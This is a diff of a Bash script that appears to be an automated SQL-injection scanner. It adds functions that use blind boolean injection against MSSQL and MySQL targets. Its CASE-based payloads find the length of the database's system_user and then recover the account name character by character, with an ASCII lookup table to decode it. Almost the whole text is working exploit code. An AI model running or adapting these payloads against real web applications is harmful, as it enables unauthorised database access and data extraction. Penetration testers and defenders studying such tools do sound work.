@@ -480,81 +480,16 @@ length_false=`echo $response | cut -d ":" -f 2`
 if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 	echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
 	mssqldb=1
+	lettergrabmssql
 fi
-#if [[ "$status_true" == "$status_false" ]] ; then
+if [[ "$status_true" == "$status_false" ]] ; then
 	if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
 		echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
 		tput sgr0 # Reset attributes.
 		mssqldb=1
-
-###get the length of the string
-horiz=40
-oflag=1
-	while [[ $oflag -lt $horiz ]] ; do
-		badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),1,1))+>+255)+then+1+else+0+end)$end"`
-		requester
-		#echo "debug sending $request"
-		status_false=`echo $response | cut -d ":" -f 1`
-		length_false=`echo $response | cut -d ":" -f 2` 
-		badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(len(system_user)+=+$oflag)+then+1+else+0+end)"`
-		requester
-		#echo "debug sending iflag $request"
-		status_true=`echo $response | cut -d ":" -f 1`
-		length_true=`echo $response | cut -d ":" -f 2`
-				
-		((lendiff=$length_true-$length_false))
-		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-			echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
-			sysuserlen=$oflag
-			oflag=40
-		fi
-		#if [[ "$status_true" == "$status_false" ]] ; then
-			#if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
-		#
-		#	fi
-		#fi
-		((oflag=$oflag+1)) 
-	done
-###
-
-
-
-###
-vert=128
-horiz=$sysuserlen
-oflag=1
-iflag=1
-	while [[ $oflag -le $horiz ]] ; do
-		badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),$oflag,1))+=+$iflag)+then+1+else+0+end)$end"`
-		requester
-		#echo "debug sending iflag $request"
-		status_true=`echo $response | cut -d ":" -f 1`
-		length_true=`echo $response | cut -d ":" -f 2`
-		badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),1,1))+>+255)+then+1+else+0+end)$end"`
-		requester
-		#echo "debug sending $request"
-		status_false=`echo $response | cut -d ":" -f 1`
-		length_false=`echo $response | cut -d ":" -f 2` 
-		((lendiff=$length_true-$length_false))
-		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-			echo -n "$iflag "
-			iflag=255
-		fi
-		#if [[ "$status_true" == "$status_false" ]] ; then
-			#if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
-		#
-		#	fi
-		#fi
-		((iflag=$iflag+1)) 
-		if [[ $iflag == 256 ]] ; then
-			((iflag=0))
-			((oflag=$oflag+1))
-		fi	
-		done
-		echo ""
-###
+ 		lettergrabmssql
 	fi
-#fi
+fi
 
 #mysqlcheck - only works on numeric params
 badparams=`echo "$outputstore" | replace "$encodedpayload" "1/case+when+ascii(substr(system_user(),1,1))+>+0+then+1+else+0+end$end"`
@@ -575,6 +510,7 @@ fi
 		echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
 		tput sgr0 # Reset attributes.
 		mysqldb=1
+ 		lettergrabmysql
 	fi
 #fi
 
@@ -599,6 +535,257 @@ fi
 		oracle=1
 	fi
 #fi
+}
+
+lettergrabmssql()
+{
+###get the length of the string
+horiz=40
+oflag=1
+while [[ $oflag -lt $horiz ]] ; do
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),1,1))+>+255)+then+1+else+0+end)$end"`
+	requester
+	#echo "debug sending $request"
+	status_false=`echo $response | cut -d ":" -f 1`
+	length_false=`echo $response | cut -d ":" -f 2` 
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(len(system_user)+=+$oflag)+then+1+else+0+end)"`
+	requester
+	#echo "debug sending iflag $request"
+	status_true=`echo $response | cut -d ":" -f 1`
+	length_true=`echo $response | cut -d ":" -f 2`
+			
+	((lendiff=$length_true-$length_false))
+	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+		echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+		sysuserlen=$oflag
+		oflag=40
+	fi
+	#if [[ "$status_true" == "$status_false" ]] ; then
+		#if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+	#
+	#	fi
+	#fi
+	((oflag=$oflag+1)) 
+done
+###
+horiz=$sysuserlen
+oflag=1
+iflag=32
+nambuff=""
+echo "Attempting to brute force the system_user account name. Please wait..."
+while [[ $oflag -le $horiz ]] ; do
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),$oflag,1))+=+$iflag)+then+1+else+0+end)$end"`
+	requester
+	#echo "debug sending iflag $request"
+	status_true=`echo $response | cut -d ":" -f 1`
+	length_true=`echo $response | cut -d ":" -f 2`
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),1,1))+>+255)+then+1+else+0+end)$end"`
+	requester
+	#echo "debug sending $request"
+	status_false=`echo $response | cut -d ":" -f 1`
+	length_false=`echo $response | cut -d ":" -f 2` 
+	((lendiff=$length_true-$length_false))
+	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+		decasciiconv
+		echo -n "$output"
+		nambuf="$nambuf$output"
+		iflag=126
+	fi
+	#if [[ "$status_true" == "$status_false" ]] ; then
+		#if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+	#
+	#	fi
+	#fi
+	((iflag=$iflag+1)) 
+	if [[ $iflag == 127 ]] ; then
+		((iflag=32))
+		((oflag=$oflag+1))
+	fi	
+done
+echo ""
+if [[ $nambuf != "" ]] ; then 
+	echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
+fi
+}
+
+lettergrabmysql()
+{
+###get the length of the string
+horiz=40
+oflag=1
+while [[ $oflag -lt $horiz ]] ; do
+#								  
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=(case+when+(length(system_user())+>+1000)+then+1+else+2+end)"`
+	requester
+	#echo "debug sending $request"
+	status_false=`echo $response | cut -d ":" -f 1`
+	length_false=`echo $response | cut -d ":" -f 2` 
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=(case+when+(length(system_user())+=+$oflag)+then+1+else+2+end)"`
+	requester
+	#echo "debug sending iflag $request"
+	status_true=`echo $response | cut -d ":" -f 1`
+	length_true=`echo $response | cut -d ":" -f 2`
+			
+	((lendiff=$length_true-$length_false))
+	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+		echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+		sysuserlen=$oflag
+		oflag=40
+	fi
+	if [[ "$status_true" == "$status_false" ]] ; then
+		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+			echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+			sysuserlen=$oflag
+			oflag=40
+		fi
+	fi
+	((oflag=$oflag+1)) 
+done
+###
+horiz=$sysuserlen
+oflag=1
+iflag=32
+nambuff=""
+echo "Attempting to brute force the current MYSQL DB account name account name. Please wait..."
+while [[ $oflag -le $horiz ]] ; do				   
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=(case+when+(ascii(substring(system_user(),$oflag,1))+=+$iflag)+then+1+else+2+end)$end"`
+	requester
+	#echo "debug sending iflag $request"
+	status_true=`echo $response | cut -d ":" -f 1`
+	length_true=`echo $response | cut -d ":" -f 2`
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=(case+when+(ascii(substring(system_user(),1,1))+>+255)+then+1+else+2+end)$end"`
+	requester
+	#echo "debug sending $request"
+	status_false=`echo $response | cut -d ":" -f 1`
+	length_false=`echo $response | cut -d ":" -f 2` 
+	((lendiff=$length_true-$length_false))
+	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+		decasciiconv
+		echo -n "$output"
+		nambuf="$nambuf$output"
+		iflag=126
+	fi
+	if [[ "$status_true" == "$status_false" ]] ; then
+		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+			decasciiconv
+			echo -n "$output"
+			nambuf="$nambuf$output"
+			iflag=126
+		fi
+	fi
+	((iflag=$iflag+1)) 
+	if [[ $iflag == 127 ]] ; then
+		((iflag=32))
+		((oflag=$oflag+1))
+	fi	
+done
+echo ""
+if [[ $nambuf != "" ]] ; then 
+	echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
+fi
+}
+
+
+decasciiconv()
+{
+output=""
+case $iflag in 
+32) output=" " ;;
+33) output="!" ;;
+34) output=" " ;;
+35) output="#" ;;
+36) output="$" ;;
+37) output="%" ;;
+38) output="&" ;;
+39) output="'" ;;
+40) output=" " ;;
+41) output=" " ;;
+42) output="*" ;;
+43) output="+" ;;
+44) output="," ;;
+45) output="-" ;;
+46) output="." ;;
+47) output="/" ;;
+48) output=0 ;;
+49) output=1 ;;
+50) output=2 ;;
+51) output=3 ;;
+52) output=4 ;;
+53) output=5 ;;
+54) output=6 ;;
+55) output=7 ;;
+56) output=8 ;;
+57) output=9 ;;
+58) output=":" ;;
+59) output=";" ;;
+60) output="<" ;;
+61) output="=" ;;
+62) output=">" ;;
+63) output="?" ;;
+64) output="@" ;;
+65) output=A ;;
+66) output=B ;;
+67) output=C ;;
+68) output=D ;;
+69) output=E ;;
+70) output=F ;;
+71) output=G ;;
+72) output=H ;;
+73) output=I ;;
+74) output=J ;;
+75) output=K ;;
+76) output=L ;;
+77) output=M ;;
+78) output=N ;;
+79) output=O ;;
+80) output=P ;;
+81) output=Q ;;
+82) output=R ;;
+83) output=S ;;
+84) output=T ;;
+85) output=U ;;
+86) output=V ;;
+87) output=W ;;
+88) output=X ;;
+89) output=Y ;;
+90) output=Z ;;
+91) output="[" ;;
+92) output=" " ;;
+93) output="]" ;;
+94) output="^" ;;
+95) output="_" ;;
+96) output=" " ;;
+97) output=a ;;
+98) output=b ;;
+99) output=c ;;
+100) output=d ;;
+101) output=e ;;
+102) output=f ;;
+103) output=g ;;
+104) output=h ;;
+105) output=i ;;
+106) output=j ;;
+107) output=k ;;
+108) output=l ;;
+109) output=m ;;
+110) output=n ;;
+111) output=o ;;
+112) output=p ;;
+113) output=q ;;
+114) output=r ;;
+115) output=s ;;
+116) output=t ;;
+117) output=u ;;
+118) output=v ;;
+119) output="w" ;;
+120) output=x ;;
+121) output=y ;;
+122) output=z ;;
+123) output="{" ;;
+124) output="|" ;;
+125) output="}" ;;
+126) output="~" ;;
+esac
 }
 
 ##### END OF FUNCTION DEFINITIONS SECTION ######	
